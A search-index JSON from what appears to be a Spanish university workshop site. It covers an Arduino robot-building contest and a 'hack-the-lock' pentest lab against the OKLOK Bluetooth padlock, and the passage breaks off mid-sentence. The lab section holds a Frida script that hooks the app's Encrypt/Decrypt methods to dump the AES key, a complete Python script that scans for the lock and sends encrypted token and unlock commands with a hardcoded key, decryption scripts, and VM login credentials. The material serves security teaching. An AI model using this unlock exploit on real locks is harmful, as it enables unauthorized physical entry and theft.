{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"IX Semana de la Inform\u00e1tica. Concurso/Taller Robotarium - FDI Bienvenidos al taller Robotarium - FDI y muchas gracias por colaborar en los primeros pasos de nuestro futuro robotarium . Recuerda que si quieres obtener ECTS por participar en actividades de la Seamana de la Inform\u00e1tica, debes inscribire en este formulario . si no lo has hecho ya. Equipos participantes Estos son los equipos participantes: Equipos Equipo NOMBRE PUNTOS POSICI\u00d3N Equipo 1 Equipo 2 Equipo 3 Equipo 4 Equipo 5 Equipo 1 NOMBRE Estudiante 1 Estudiante 2 Estudiante 3 Puntos Misi\u00f3n 1 Puntos Misi\u00f3n 2 Puntos Misi\u00f3n 3 Puntos Misi\u00f3n 4 TOTAL Equipo 2 NOMBRE Estudiante 1 Estudiante 2 Estudiante 3 Puntos Misi\u00f3n 1 Puntos Misi\u00f3n 2 Puntos Misi\u00f3n 3 Puntos Misi\u00f3n 4 TOTAL Equipo 3 NOMBRE Estudiante 1 Estudiante 2 Estudiante 3 Puntos Misi\u00f3n 1 Puntos Misi\u00f3n 2 Puntos Misi\u00f3n 3 Puntos Misi\u00f3n 4 TOTAL Equipo 4 NOMBRE Estudiante 1 Estudiante 2 Estudiante 3 Puntos Misi\u00f3n 1 Puntos Misi\u00f3n 2 Puntos Misi\u00f3n 3 Puntos Misi\u00f3n 4 TOTAL Equipo 5 NOMBRE Estudiante 1 Estudiante 2 Estudiante 3 Puntos Misi\u00f3n 1 Puntos Misi\u00f3n 2 Puntos Misi\u00f3n 3 Puntos Misi\u00f3n 4 TOTAL Estructura del Taller Este taller se compone de varias fases: Construcci\u00f3n del robot - En equipos de 3 personas, construir\u00e9is el robot y har\u00e9is que mueva sus ruedas. Recorrer una distancia - Programar\u00e9is el robot para que recorra una distancia predefinida. Hacer un c\u00edrculo - Programar\u00e9is el robot para que recorra un c\u00edrculo de 1m de radio. Hacer un cuadrado - Programar\u00e9is el robot para que recorra un cuadrado. \u00a1Cuidado con las esquinas! Misi\u00f3n 1: Construcci\u00f3n del Robot Misi\u00f3n 1 Construye el robot y consigue que se muevan sus motores. El primer equipo en lograrlo tendr\u00e1 puntos extra. En esta primera etapa el objetivo es que mont\u00e9is el chasis del robot y realic\u00e9is todas las conexiones necesarias para que el robot pueda mover las ruedas. Para ello tendr\u00e9is que seguir los siguientes pasos: Montar el chasis con los motores, ruedas y rueda loca. Montar el sensor de odometr\u00eda para poder medir la distancia que recorre el robot. Conectar la alimentaci\u00f3n Conectar los motores con la placa de control y el Arduino Vamos paso a paso. Montar la el chasis rojo En la caja de cart\u00f3n tienes las piezas y torniller\u00eda necesarias para montar el chasis del robot. Sigue las instrucciones en papel que vienen en la caja. El \u00fanico paso que no figura en las instrucciones es la manera de colocar la rueda con agujeros que nos va a permitir detectar el movimiento de las ruedas usando el sensor de infrarrojos. Al final de este paso vuestro robot se tiene que parecer a este Montar el sensor de infrarrojos para la odometr\u00eda Ahora toca montar los sensores de infrarrojos que van a detectar los agujeros de la rueda de pl\u00e1stico y de esta manera se podr\u00e1n ir contando las vueltas que va dando cada una de las ruedas y as\u00ed estimar la distancia que recorre cada rueda del robot. Fijad los sensores con cinta de doble cara como se indica en las im\u00e1genes. Conectar la alimentaci\u00f3n Para alimentar toda la electr\u00f3nica necesitamos un regulador de tensi\u00f3n. A la entrada de este regulador se conecta la bater\u00eda y a la salida los pines de alimentaci\u00f3n del Arduino. Ajustar la tensi\u00f3n de salida Antes de conectar la salida del regulador a los pines de alimentaci\u00f3n del Arduino hay que ajustar el valor de voltaje de salida. Para ajustarlo se usa el potenci\u00f3metro azul de la placa hasta que midas con el mult\u00edmetro 8 voltios a la salida. Conectar la placa de control de los motores Para poder accionar los motores se usa una placa controladora con un puente en H. A esta placa es a la que se conectan los motores y las salidas de Arduino con las que vamos a controlarlos. Quita los jumpers que unen los pines ENA y ENB de la placa del puente en H Ya s\u00f3lo queda colocar el Arduino, el interruptor y conectar correctamente entre ellos todos los sistemas. Bater\u00eda Bater\u00eda + Interruptor Bater\u00eda - Regulador IN - Interruptor Interruptor 1 Bater\u00eda + Interruptor 2 Regulador IN + Regulador In + Interruptor 1 In - Bater\u00eda - Out + Puente en H VD Out - Puente en H GND Puente en H GND Regulador Out - GND Arduino GND +12 Arduino VIN +12 Regulador Out + ENA Arduino D4 IN1 Arduino D2 IN2 Arduino D3 IN3 Arduino D5 IN4 Arduino D6 ENB Arduino D7 OUT1 Motor1 + OUT2 Motor1 - OUT3 Motor2 + OUT4 Motor2 - Sensor Infrarrojo Derecho VCC Arduino Rst GND Arduino GND D0 Arduino D6 Sensor Infrarrojo Izquierdo VCC Arduino Rst GND Arduino GND D0 Arduino D7 Descargar el firmware del robot Ya lo tienes listo para descargar el firmware del robot y \u00a1\u00a1empezar a programar!! El c\u00f3digo base necesario lo tienes disponible en nuestro repo de github Desc\u00e1rgalo y \u00e1brelo con el IDE de Arduino. Ver\u00e1s que hay dos archivos: agent.ino es el c\u00f3digo principal de Arduino. Es en este archivo donde tienes las funciones principales que puedes usar y que os damos para facilitar la puesta en marcha y donde tendr\u00e1s que escribir tu c\u00f3digo. common.h contiene las definiciones de variables y estructuras Puedes conseguir que el robot mueva las ruedas usando las siguientes funciones: moveForward(const int pinMotor[3],int speed); moveBackward(const int pinMotor[3],int speed); fullStop(const int pinMotor[3]); Esas tres funciones reciben como par\u00e1metro el array donde est\u00e1n almacenados los tres pines donde est\u00e1 conectado el motor (puedes verla definici\u00f3n en common.h). Tambi\u00e9n reciben el par\u00e1metro speed, que es un entero entre 0 y 255 que indica la potencia que se quiere comandar al motor. As\u00ed que s\u00f3lo tienes que indicar el array del motor que quieres mover y la velocidad. Atencion Los motores tienen una zona muerta ya que necesitan una potencia el\u00e9ctrica m\u00ednima para comenzar a mover el eje, La zona muerta es diferente para cada motor Misi\u00f3n 1 \u00bfTienes el robot completamente montado y logras mover ya los motores? Corre y ens\u00e9\u00f1anoslo. El primer equipo en conseguirlo tendr\u00e1 10 puntos, el siguiente 8, el tercero 6 etc... Misi\u00f3n 2: Recorrer 2m Misi\u00f3n 2 Vuestra misi\u00f3n ahora es conseguir que el robot recorra 2m en l\u00ednea recta El equipo cuyo robot recorra la distancia de 2m con menos error recibir\u00e1 10 puntos, el segundo 8 y as\u00ed sucesivamente. Adem\u00e1s el equipo que primero consiga recorrer 2m (m\u00e1s menos 20 cm) recibir\u00e1 2 puntos adicionales. \u00bfOs parece una misi\u00f3n sencilla? Tal vez no lo es tanto. Para saber la distancia que ha recorrido el robot tendr\u00e9is que usar los encoders. Nuestros enconders est\u00e1n formados por un sensor de infrarrojos y una rueda con ranuras para cada rueda del robot. La rueda con ranuras gira solidaria con la rueda del robot, de manera que el sensor de infrarrojos detecta el paso de las ranuras. Contando las ranuras que el sensor detecta en un tiempo determinado y conociendo el di\u00e1metro de las ruedas de nuestro robot podemos calcular la distancia que recorre cada rueda. Puedes obtener las lecturas de los encoders de las dos ruedas leyendo las variables count_left_wheel y count_right_wheel que son actualizadas con la funci\u00f3n update que se llama cada 100 ms. Esta funci\u00f3n actualiza tambi\u00e9n el valor de dt_s que es el tiempo transcurrido entre dos llamadas sucesivas Misi\u00f3n 3: Recorrer una trayectoria circular de radio 1m Misi\u00f3n 3 Vuestra misi\u00f3n ahora es conseguir que el robot recorra una trayectoria circular de radio 1m movi\u00e9ndose en el sentido de las agujas del reloj. El equipo cuyo robot recorra el c\u00edrculo con menos error recibir\u00e1 10 puntos, el segundo 8 y as\u00ed sucesivamente. Adem\u00e1s el equipo que primero consiga recorrer el c\u00edrculo con correcci\u00f3n recibir\u00e1 2 puntos adicionales. Misi\u00f3n 4: Recorrer una trayectoria cuadrada de lado 1m Misi\u00f3n final Esta es la misi\u00f3n m\u00e1s complicada. Vuestro robot deber\u00e1 recorrer un cuadrado de 1m de lado en el sentido de las agujas del reloj. El equipo cuyo robot recorra el cuadrado con menos error recibir\u00e1 10 puntos, el segundo 8 y as\u00ed sucesivamente. Adem\u00e1s el equipo que primero consiga recorrer el cuadrado con correcci\u00f3n recibir\u00e1 2 puntos adicionales. Valoraci\u00f3n del taller Encuesta Por favor, rellena la encuesta de valoraci\u00f3n del taller antes de marcharte Enlace a la encuesta","title":"IX Semana Inform\u00e1tica"},{"location":"#ix-semana-de-la-informatica-concursotaller-robotarium-fdi","text":"Bienvenidos al taller Robotarium - FDI y muchas gracias por colaborar en los primeros pasos de nuestro futuro robotarium . Recuerda que si quieres obtener ECTS por participar en actividades de la Seamana de la Inform\u00e1tica, debes inscribire en este formulario . si no lo has hecho ya.","title":"IX Semana de la Inform\u00e1tica. Concurso/Taller Robotarium - FDI"},{"location":"#equipos-participantes","text":"Estos son los equipos participantes: Equipos Equipo NOMBRE PUNTOS POSICI\u00d3N Equipo 1 Equipo 2 Equipo 3 Equipo 4 Equipo 5 Equipo 1 NOMBRE Estudiante 1 Estudiante 2 Estudiante 3 Puntos Misi\u00f3n 1 Puntos Misi\u00f3n 2 Puntos Misi\u00f3n 3 Puntos Misi\u00f3n 4 TOTAL Equipo 2 NOMBRE Estudiante 1 Estudiante 2 Estudiante 3 Puntos Misi\u00f3n 1 Puntos Misi\u00f3n 2 Puntos Misi\u00f3n 3 Puntos Misi\u00f3n 4 TOTAL Equipo 3 NOMBRE Estudiante 1 Estudiante 2 Estudiante 3 Puntos Misi\u00f3n 1 Puntos Misi\u00f3n 2 Puntos Misi\u00f3n 3 Puntos Misi\u00f3n 4 TOTAL Equipo 4 NOMBRE Estudiante 1 Estudiante 2 Estudiante 3 Puntos Misi\u00f3n 1 Puntos Misi\u00f3n 2 Puntos Misi\u00f3n 3 Puntos Misi\u00f3n 4 TOTAL Equipo 5 NOMBRE Estudiante 1 Estudiante 2 Estudiante 3 Puntos Misi\u00f3n 1 Puntos Misi\u00f3n 2 Puntos Misi\u00f3n 3 Puntos Misi\u00f3n 4 TOTAL","title":"Equipos participantes"},{"location":"#estructura-del-taller","text":"Este taller se compone de varias fases: Construcci\u00f3n del robot - En equipos de 3 personas, construir\u00e9is el robot y har\u00e9is que mueva sus ruedas. Recorrer una distancia - Programar\u00e9is el robot para que recorra una distancia predefinida. Hacer un c\u00edrculo - Programar\u00e9is el robot para que recorra un c\u00edrculo de 1m de radio. Hacer un cuadrado - Programar\u00e9is el robot para que recorra un cuadrado. \u00a1Cuidado con las esquinas!","title":"Estructura del Taller"},{"location":"#mision-1-construccion-del-robot","text":"Misi\u00f3n 1 Construye el robot y consigue que se muevan sus motores. El primer equipo en lograrlo tendr\u00e1 puntos extra. En esta primera etapa el objetivo es que mont\u00e9is el chasis del robot y realic\u00e9is todas las conexiones necesarias para que el robot pueda mover las ruedas. Para ello tendr\u00e9is que seguir los siguientes pasos: Montar el chasis con los motores, ruedas y rueda loca. Montar el sensor de odometr\u00eda para poder medir la distancia que recorre el robot. Conectar la alimentaci\u00f3n Conectar los motores con la placa de control y el Arduino Vamos paso a paso.","title":"Misi\u00f3n 1: Construcci\u00f3n del Robot"},{"location":"#montar-la-el-chasis-rojo","text":"En la caja de cart\u00f3n tienes las piezas y torniller\u00eda necesarias para montar el chasis del robot. Sigue las instrucciones en papel que vienen en la caja. El \u00fanico paso que no figura en las instrucciones es la manera de colocar la rueda con agujeros que nos va a permitir detectar el movimiento de las ruedas usando el sensor de infrarrojos. Al final de este paso vuestro robot se tiene que parecer a este","title":"Montar la el chasis rojo"},{"location":"#montar-el-sensor-de-infrarrojos-para-la-odometria","text":"Ahora toca montar los sensores de infrarrojos que van a detectar los agujeros de la rueda de pl\u00e1stico y de esta manera se podr\u00e1n ir contando las vueltas que va dando cada una de las ruedas y as\u00ed estimar la distancia que recorre cada rueda del robot. Fijad los sensores con cinta de doble cara como se indica en las im\u00e1genes.","title":"Montar el sensor de infrarrojos para la odometr\u00eda"},{"location":"#conectar-la-alimentacion","text":"Para alimentar toda la electr\u00f3nica necesitamos un regulador de tensi\u00f3n. A la entrada de este regulador se conecta la bater\u00eda y a la salida los pines de alimentaci\u00f3n del Arduino. Ajustar la tensi\u00f3n de salida Antes de conectar la salida del regulador a los pines de alimentaci\u00f3n del Arduino hay que ajustar el valor de voltaje de salida. Para ajustarlo se usa el potenci\u00f3metro azul de la placa hasta que midas con el mult\u00edmetro 8 voltios a la salida.","title":"Conectar la alimentaci\u00f3n"},{"location":"#conectar-la-placa-de-control-de-los-motores","text":"Para poder accionar los motores se usa una placa controladora con un puente en H. A esta placa es a la que se conectan los motores y las salidas de Arduino con las que vamos a controlarlos. Quita los jumpers que unen los pines ENA y ENB de la placa del puente en H Ya s\u00f3lo queda colocar el Arduino, el interruptor y conectar correctamente entre ellos todos los sistemas. Bater\u00eda Bater\u00eda + Interruptor Bater\u00eda - Regulador IN - Interruptor Interruptor 1 Bater\u00eda + Interruptor 2 Regulador IN + Regulador In + Interruptor 1 In - Bater\u00eda - Out + Puente en H VD Out - Puente en H GND Puente en H GND Regulador Out - GND Arduino GND +12 Arduino VIN +12 Regulador Out + ENA Arduino D4 IN1 Arduino D2 IN2 Arduino D3 IN3 Arduino D5 IN4 Arduino D6 ENB Arduino D7 OUT1 Motor1 + OUT2 Motor1 - OUT3 Motor2 + OUT4 Motor2 - Sensor Infrarrojo Derecho VCC Arduino Rst GND Arduino GND D0 Arduino D6 Sensor Infrarrojo Izquierdo VCC Arduino Rst GND Arduino GND D0 Arduino D7","title":"Conectar la placa de control de los motores"},{"location":"#descargar-el-firmware-del-robot","text":"Ya lo tienes listo para descargar el firmware del robot y \u00a1\u00a1empezar a programar!! El c\u00f3digo base necesario lo tienes disponible en nuestro repo de github Desc\u00e1rgalo y \u00e1brelo con el IDE de Arduino. Ver\u00e1s que hay dos archivos: agent.ino es el c\u00f3digo principal de Arduino. Es en este archivo donde tienes las funciones principales que puedes usar y que os damos para facilitar la puesta en marcha y donde tendr\u00e1s que escribir tu c\u00f3digo. common.h contiene las definiciones de variables y estructuras Puedes conseguir que el robot mueva las ruedas usando las siguientes funciones: moveForward(const int pinMotor[3],int speed); moveBackward(const int pinMotor[3],int speed); fullStop(const int pinMotor[3]); Esas tres funciones reciben como par\u00e1metro el array donde est\u00e1n almacenados los tres pines donde est\u00e1 conectado el motor (puedes verla definici\u00f3n en common.h). Tambi\u00e9n reciben el par\u00e1metro speed, que es un entero entre 0 y 255 que indica la potencia que se quiere comandar al motor. As\u00ed que s\u00f3lo tienes que indicar el array del motor que quieres mover y la velocidad. Atencion Los motores tienen una zona muerta ya que necesitan una potencia el\u00e9ctrica m\u00ednima para comenzar a mover el eje, La zona muerta es diferente para cada motor Misi\u00f3n 1 \u00bfTienes el robot completamente montado y logras mover ya los motores? Corre y ens\u00e9\u00f1anoslo. El primer equipo en conseguirlo tendr\u00e1 10 puntos, el siguiente 8, el tercero 6 etc...","title":"Descargar el firmware del robot"},{"location":"#mision-2-recorrer-2m","text":"Misi\u00f3n 2 Vuestra misi\u00f3n ahora es conseguir que el robot recorra 2m en l\u00ednea recta El equipo cuyo robot recorra la distancia de 2m con menos error recibir\u00e1 10 puntos, el segundo 8 y as\u00ed sucesivamente. Adem\u00e1s el equipo que primero consiga recorrer 2m (m\u00e1s menos 20 cm) recibir\u00e1 2 puntos adicionales. \u00bfOs parece una misi\u00f3n sencilla? Tal vez no lo es tanto. Para saber la distancia que ha recorrido el robot tendr\u00e9is que usar los encoders. Nuestros enconders est\u00e1n formados por un sensor de infrarrojos y una rueda con ranuras para cada rueda del robot. La rueda con ranuras gira solidaria con la rueda del robot, de manera que el sensor de infrarrojos detecta el paso de las ranuras. Contando las ranuras que el sensor detecta en un tiempo determinado y conociendo el di\u00e1metro de las ruedas de nuestro robot podemos calcular la distancia que recorre cada rueda. Puedes obtener las lecturas de los encoders de las dos ruedas leyendo las variables count_left_wheel y count_right_wheel que son actualizadas con la funci\u00f3n update que se llama cada 100 ms. Esta funci\u00f3n actualiza tambi\u00e9n el valor de dt_s que es el tiempo transcurrido entre dos llamadas sucesivas","title":"Misi\u00f3n 2: Recorrer 2m"},{"location":"#mision-3-recorrer-una-trayectoria-circular-de-radio-1m","text":"Misi\u00f3n 3 Vuestra misi\u00f3n ahora es conseguir que el robot recorra una trayectoria circular de radio 1m movi\u00e9ndose en el sentido de las agujas del reloj. El equipo cuyo robot recorra el c\u00edrculo con menos error recibir\u00e1 10 puntos, el segundo 8 y as\u00ed sucesivamente. Adem\u00e1s el equipo que primero consiga recorrer el c\u00edrculo con correcci\u00f3n recibir\u00e1 2 puntos adicionales.","title":"Misi\u00f3n 3: Recorrer una trayectoria circular de radio 1m"},{"location":"#mision-4-recorrer-una-trayectoria-cuadrada-de-lado-1m","text":"Misi\u00f3n final Esta es la misi\u00f3n m\u00e1s complicada. Vuestro robot deber\u00e1 recorrer un cuadrado de 1m de lado en el sentido de las agujas del reloj. El equipo cuyo robot recorra el cuadrado con menos error recibir\u00e1 10 puntos, el segundo 8 y as\u00ed sucesivamente. Adem\u00e1s el equipo que primero consiga recorrer el cuadrado con correcci\u00f3n recibir\u00e1 2 puntos adicionales.","title":"Misi\u00f3n 4: Recorrer una trayectoria cuadrada de lado 1m"},{"location":"#valoracion-del-taller","text":"Encuesta Por favor, rellena la encuesta de valoraci\u00f3n del taller antes de marcharte Enlace a la encuesta","title":"Valoraci\u00f3n del taller"},{"location":"hack-the-lock/","text":"Pentest candado Bluetooth OKLOK El objetivo de este Test de Penetraci\u00f3n (Pentest) consiste en ver si somos capaces de encontrar la clave de desbloqueo de un candado inteligente para poder abrirlo mediante conexi\u00f3n bluetooth sin permiso del usuario. El candado objetivo, modelo OKLOK Padlock , es un candado que se puede desbloquear mediante huella digital y usando una App Android dise\u00f1ada para tal efecto. Las versiones antiguas del candado tienen una vulnerabilidad conocida y documentada ( TFM Jesus Alberto Tejedor Doria, 2020 , basado en Attify Pentest kit ) que permit\u00eda averiguar la clave de desbloqueo de una manera relativamente sencilla. Sin embargo, el fabricante ha actualizado la aplicaci\u00f3n de Android , complicando la obtenci\u00f3n de dicha clave. El objetivo de este taller consiste en ser capaces de encontrar la clave de acceso mediante el estudio e instrumentaci\u00f3n de la nueva aplicaci\u00f3n. Para ello os explicar\u00e9 c\u00f3mo se consegu\u00eda la clave usando la aplicaci\u00f3n antigua ( M-IoT S&L P2: Pentest_Lock ), con la esperanza de que alg\u00fan hacker sea capaz de obtener claves nuevas de los candados que tenemos en la FDI y as\u00ed poder volver a utilizar la pr\u00e1ctica dentro de la asignatura Seguridad y Legalidad del M\u00e1ster de IoT. Existe otro agujero de seguridad documentado que puede resultar de utilidad: Transfer ownership of any FB50 smart lock to yourself (CVE-2019-13143) FB50 Smart Lock Vulnerability Disclosure (CVE-2019-13143) Picking the FB50 smart lock (CVE-2019-13143) Material necesario Para intentar replicar el hack necesitaremos un ordenador con Linux instalado y un dispositivo Android rooteado . Para facilitar la tarea os dejo una imagen de una m\u00e1quina virtual de Ubuntu Mate y una imagen de Android para Raspberry Pi 4 . VirtualBox Ubuntu Mate 18.04 64b En este enlace Ubuntu Mate 18.04.1 64b os dejo una MV preparada con todo lo que listo a continuaci\u00f3n. Para poder descargar el fichero deber\u00e9is de estar identificados con la cuenta de correo de la UCM . Usuario/contrase\u00f1a: master_iot / SyL Paquetes instalados sobre la versi\u00f3n stock : sudo apt-get install ubertooth sudo apt-get install python-pip libglib2.0-dev python-dev sudo pip install bluepy sudo pip install pycrypto sudo pip install pyaes sudo apt install aapt sudo apt install apktool sudo apt install zipalign sudo apt install python3-pip sudo pip3 install objection sudo apt install adb sudo apt install default-jdk Acceso a unidades compartidas con el Host: sudo adduser masteriot vboxsf La versi\u00f3n de apk-tool del repositorio ( v.v2.4.0-dirty ) no parece valerle a objection : Error apktool version should be at least 2.4.1 . Copiamos apk-tool v2.4.1 en ~/bin y mantenemos el paquete, ya que instala algo necesario (no he localizado el qu\u00e9). Wireshark actualizado y sin privilegios (requiere logout ). Wireshark permite monitorizar la red del Host si se configura en modo bridged y con la configuraci\u00f3n Promiscuous mode: Allow all. sudo add-apt-repository ppa:wireshark-dev/stable sudo apt-get update sudo apt-get install wireshark sudo dpkg-reconfigure wireshark-common sudo addgroup masteriot wireshark Bettercap : Descargar y copiar el binario precompilado en /sbin/ , necesita librer\u00edas Jadx : Descargar y copiar en /opt/jadx-1.1.0 Nota: este programa consume muchos recursos, asignar 4GiB y 2 CPUs en la MV sudo apt-get install libpcap-dev libnetfilter-queue-dev Raspberry Pi Android 9 (LineageOS 16.0) Enlace a la imagen original LineageOS 16.0 . Para poder descargar el fichero deber\u00e9is de estar identificados con la cuenta de correo de la UCM . Manual: LineageOS 16.0 (Android 9) Necesario conectar un monitor HDMI sin adaptador, o configurar a mano la resoluci\u00f3n seg\u00fan manual. Pasos del manual necesarios: Habilitar opciones de desarrollador Habilitar acceso de root Otras consideraciones: Bot\u00f3n de apagado: F5 Es necesario activar adb por red Habilitar log bluetooth Servidor frida: frida-server-14.2.8-android-arm Apks y utilidades Android Apk Os dejo dos versiones antiguas de la App Oklok que no est\u00e1n muy ofuscadas: oklok_v1.3.0.apk oklok_v1.5.7.apk Script Frida Script para conseguir la clave mediante Frida: Java.perform(function () { var CMDUtils = Java.use('com.coolu.blelibrary.utils.CMDUtils'); var log_byte_array = function (arr) { var result = \"\"; var buffer = Java.array('byte', arr); for(var i = 0; i < buffer.length; ++i) { var hexb = (buffer[i] & 0xFF).toString(16); if (hexb.length == 1) hexb = '0' + hexb; result += hexb; } console.log(result); }; CMDUtils.Encrypt.implementation = function (pt, key) { console.log('[+] Inside Encrypt() ======'); var ct = this.Encrypt(pt, key); console.log('Pt:') log_byte_array(pt) console.log('key:') log_byte_array(key); return ct; }; CMDUtils.Decrypt.implementation = function (ct, key) { console.log('[+] Inside Decrypt() ======'); var pt = this.Decrypt(ct, key); console.log('Pt:') log_byte_array(pt) console.log('Key:') log_byte_array(key); return pt; }; }); Script de apertura Script Python 2 para abrir el candado (una vez que conocemos la clave AES ): from bluepy.btle import Scanner, Peripheral, DefaultDelegate from Crypto.Cipher import AES AESKEY = '034100624f0a29355c193f1a39192356' class MyDelegate(DefaultDelegate): def __init__(self): DefaultDelegate.__init__(self) self.token = None def handleNotification(self, cHandle, data): cipher = AES.new(AESKEY.decode('hex'), AES.MODE_ECB) pt = cipher.decrypt(data) if pt.startswith('\\x06\\x02\\x07'): self.token = pt[3:7] print '[+] Token:', self.token.encode('hex') def connect(addr): print '[+] Connecting' p = Peripheral(addr) write_char = p.getCharacteristics(uuid='000036f5-0000-1000-8000-00805f9b34fb')[0] notify_char = p.getCharacteristics(uuid='000036f6-0000-1000-8000-00805f9b34fb')[0] # Enable notifications, https://stackoverflow.com/a/15722811 p.writeCharacteristic(7, '0100'.decode('hex'), withResponse=True) d = MyDelegate() p.withDelegate(d) gettokencmd = '06010101' + '0'*24 gettokstr = AES.new(AESKEY.decode('hex'), AES.MODE_ECB).encrypt(gettokencmd.decode('hex')) print '[+] Sending GET_TOKEN command' write_char.write(gettokstr, withResponse=True) p.waitForNotifications(2) if d.token != None: cipher = AES.new(AESKEY.decode('hex'), AES.MODE_ECB) # Send unlock command pt = '050106303030303030'.decode('hex') + d.token + '\\x00\\x00\\x00' write_char.write(cipher.encrypt(pt)) print '[+] Sent unlock command' def main(): s = Scanner() print '[+] Scanning for 5s...' s.scan(5) for dev in s.getDevices(): if dev.getValueText(0x9) == 'BlueFPL': print '[+] Found OKLOK' connect(dev.addr) break if __name__ == '__main__': main() An\u00e1lisis de tr\u00e1fico BT de una secuencia de apertura Ejemplo de captura y an\u00e1lisis de tr\u00e1fico mediante Wireshark: btsnoop_hci.log Salida de Frida por pantalla: $ frida -U -l oklok-frida_new.js com.oklok.y ____ / _ | Frida 14.2.8 - A world-class dynamic instrumentation toolkit | (_| | > _ | Commands: /_/ |_| help -> Displays the help system . . . . object? -> Display information about 'object' . . . . exit/quit -> Exit . . . . . . . . More info at https://www.frida.re/docs/home/ [VirtualBox::com.oklok.y]-> [VirtualBox::com.oklok.y]-> [+] Inside Encrypt() ====== Pt: 060101015705162b7c5b34162b4b4b2e --> Traza N\u00ba 101 key: 034100624f0a29355c193f1a39192356 [+] Inside Encrypt() ====== Pt: 0602077464a8bd010205000000000000 --> Traza N\u00ba 103 Key: 034100624f0a29355c193f1a39192356 [+] Inside Decrypt() ====== Pt: 06010101644c391e5b6a4f3237477a78 --> Traza N\u00ba 105 key: 034100624f0a29355c193f1a39192356 [+] Inside Decrypt() ====== Pt: 0602077464a8bd010205000000000000 --> Traza N\u00ba 107 Key: 034100624f0a29355c193f1a39192356 [+] Inside Encrypt() ====== Pt: 020101017464a8bd2f22114d0c157e65 --> Traza N\u00ba 109 key: 034100624f0a29355c193f1a39192356 [+] Inside Decrypt() ====== Pt: 0202015e64a8bd010205000000000000 --> Traza N\u00ba 112 Key: 034100624f0a29355c193f1a39192356 [+] Inside Encrypt() ====== Pt: 0501063030303030307464a8bd1f0375 --> Traza N\u00ba 113 key: 034100624f0a29355c193f1a39192356 [+] Inside Decrypt() ====== Pt: 0502010064a8bd010205000000000000 --> Traza N\u00ba 121 Key: 034100624f0a29355c193f1a39192356 [+] Inside Decrypt() ====== Pt: 050d010064a8bd010205000000000000 --> Traza N\u00ba 123 Key: 034100624f0a29355c193f1a39192356 Process terminated [VirtualBox::com.oklok.y]-> Script de Python 2 an\u00e1lisis de trazas: #!/usr/bin/python2.7 from Crypto.Cipher import AES import binascii aeskey=\"034100624f0a29355c193f1a39192356\" aesobj = AES.new(aeskey.decode(\"hex\"), AES.MODE_ECB) wiresharkpacket = \"64642f5d28a845260d9c3b7464d1003f\" print \"Traza 101: \" + str(aesobj.decrypt(wiresharkpacket.decode(\"hex\")).encode('hex')) wiresharkpacket = \"b7375edcb4311b888c78b794fa828853\" print \"Traza 103: \" + str(aesobj.decrypt(wiresharkpacket.decode(\"hex\")).encode('hex')) wiresharkpacket = \"d349035cb778578f78761a9b6b2344fd\" print \"Traza 105: \" + str(aesobj.decrypt(wiresharkpacket.decode(\"hex\")).encode('hex')) wiresharkpacket = \"b7375edcb4311b888c78b794fa828853\" print \"Traza 107: \" + str(aesobj.decrypt(wiresharkpacket.decode(\"hex\")).encode('hex')) wiresharkpacket = \"e2608fd9ec82d3f082962256188ca320\" print \"Traza 109: \" + str(aesobj.decrypt(wiresharkpacket.decode(\"hex\")).encode('hex')) wiresharkpacket = \"7c961523beeabc82b97305e1facb1d41\" print \"Traza 112: \" + str(aesobj.decrypt(wiresharkpacket.decode(\"hex\")).encode('hex')) wiresharkpacket = \"62a0972768b33fbe2fb95456c36b9bf6\" print \"Traza 113: \" + str(aesobj.decrypt(wiresharkpacket.decode(\"hex\")).encode('hex')) wiresharkpacket = \"71dda074a979da25e1b51f51d8689a72\" print \"Traza 121: \" + str(aesobj.decrypt(wiresharkpacket.decode(\"hex\")).encode('hex')) wiresharkpacket = \"e8a8855bb311de5ad1d12e79a5206d89\" print \"Traza 123: \" + str(aesobj.decrypt(wiresharkpacket.decode(\"hex\")).encode('hex'))","title":"hack-the-lock"},{"location":"hack-the-lock/#pentest-candado-bluetooth-oklok","text":"El objetivo de este Test de Penetraci\u00f3n (Pentest) consiste en ver si somos capaces de encontrar la clave de desbloqueo de un candado inteligente para poder abrirlo mediante conexi\u00f3n bluetooth sin permiso del usuario. El candado objetivo, modelo OKLOK Padlock , es un candado que se puede desbloquear mediante huella digital y usando una App Android dise\u00f1ada para tal efecto. Las versiones antiguas del candado tienen una vulnerabilidad conocida y documentada ( TFM Jesus Alberto Tejedor Doria, 2020 , basado en Attify Pentest kit ) que permit\u00eda averiguar la clave de desbloqueo de una manera relativamente sencilla. Sin embargo, el fabricante ha actualizado la aplicaci\u00f3n de Android , complicando la obtenci\u00f3n de dicha clave. El objetivo de este taller consiste en ser capaces de encontrar la clave de acceso mediante el estudio e instrumentaci\u00f3n de la nueva aplicaci\u00f3n. Para ello os explicar\u00e9 c\u00f3mo se consegu\u00eda la clave usando la aplicaci\u00f3n antigua ( M-IoT S&L P2: Pentest_Lock ), con la esperanza de que alg\u00fan hacker sea capaz de obtener claves nuevas de los candados que tenemos en la FDI y as\u00ed poder volver a utilizar la pr\u00e1ctica dentro de la asignatura Seguridad y Legalidad del M\u00e1ster de IoT. Existe otro agujero de seguridad documentado que puede resultar de utilidad: Transfer ownership of any FB50 smart lock to yourself (CVE-2019-13143) FB50 Smart Lock Vulnerability Disclosure (CVE-2019-13143) Picking the FB50 smart lock (CVE-2019-13143)","title":"Pentest candado Bluetooth OKLOK"},{"location":"hack-the-lock/#material-necesario","text":"Para intentar replicar el hack necesitaremos un ordenador con Linux instalado y un dispositivo Android rooteado . Para facilitar la tarea os dejo una imagen de una m\u00e1quina virtual de Ubuntu Mate y una imagen de Android para Raspberry Pi 4 .","title":"Material necesario"},{"location":"hack-the-lock/#virtualbox-ubuntu-mate-1804-64b","text":"En este enlace Ubuntu Mate 18.04.1 64b os dejo una MV preparada con todo lo que listo a continuaci\u00f3n. Para poder descargar el fichero deber\u00e9is de estar identificados con la cuenta de correo de la UCM . Usuario/contrase\u00f1a: master_iot / SyL Paquetes instalados sobre la versi\u00f3n stock : sudo apt-get install ubertooth sudo apt-get install python-pip libglib2.0-dev python-dev sudo pip install bluepy sudo pip install pycrypto sudo pip install pyaes sudo apt install aapt sudo apt install apktool sudo apt install zipalign sudo apt install python3-pip sudo pip3 install objection sudo apt install adb sudo apt install default-jdk Acceso a unidades compartidas con el Host: sudo adduser masteriot vboxsf La versi\u00f3n de apk-tool del repositorio ( v.v2.4.0-dirty ) no parece valerle a objection : Error apktool version should be at least 2.4.1 . Copiamos apk-tool v2.4.1 en ~/bin y mantenemos el paquete, ya que instala algo necesario (no 